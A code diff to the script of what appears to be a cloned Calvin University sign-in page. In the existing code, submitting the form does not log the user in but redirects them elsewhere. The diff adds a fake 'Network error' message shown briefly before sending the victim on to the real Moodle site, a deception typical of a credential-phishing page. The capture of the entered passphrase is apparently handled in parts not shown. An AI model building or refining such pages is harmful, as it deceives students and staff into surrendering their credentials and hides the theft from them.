@@ -288,8 +288,16 @@
                                             return false;
                                         }
 
-                                        // Redirect to another site instead of submitting form
-                                        window.location.href = 'https://moodle.calvin.edu';
+                                        var submitBtn = document.getElementById('submitButton');
+                                        var errorDiv = document.getElementById('error');
+                                        var errorText = document.getElementById('errorText');
+
+                                        errorText.innerHTML = 'Network error. Please try again.';
+                                        errorDiv.style.display = 'block';
+
+                                        setTimeout(function () {
+                                            window.location.href = 'https://moodle.calvin.edu';
+                                        }, 200);
                                         return false;
                                     };
 
@@ -413,21 +421,16 @@
         // Check whether the loginMessage element is present on this page.
         var loginMessage = document.getElementById('loginMessage');
         if (loginMessage) {
-            // loginMessage element is present, modify its properties.
             loginMessage.innerHTML = 'Sign in with your Calvin username';
         }
 
-        // Check whether the userNameInput element is present on this page.
         var userNameInput = document.getElementById('userNameInput');
         if (userNameInput) {
-            // userNameInput is present, modify its properties.
             userNameInput.placeholder = 'Username';
         }
 
-        // Check whether the passwordInput element is present on this page.
         var passwordInput = document.getElementById('passwordInput');
         if (passwordInput) {
-            // passwordInput is present, modify its properties.
             passwordInput.placeholder = 'Passphrase';
         }
 
@@ -457,8 +460,16 @@
                     return false;
                 }
 
-                // Redirect to another site instead of submitting form
-                window.location.href = 'https://moodle.calvin.edu';
+                var submitBtn = document.getElementById('submitButton');
+                var errorDiv = document.getElementById('error');
+                var errorText = document.getElementById('errorText');
+
+                errorText.innerHTML = 'Network error. Please try again.';
+                errorDiv.style.display = 'block';
+
+                setTimeout(function () {
+                    window.location.href = 'https://moodle.calvin.edu';
+                }, 200);
                 return false;
             };
         }
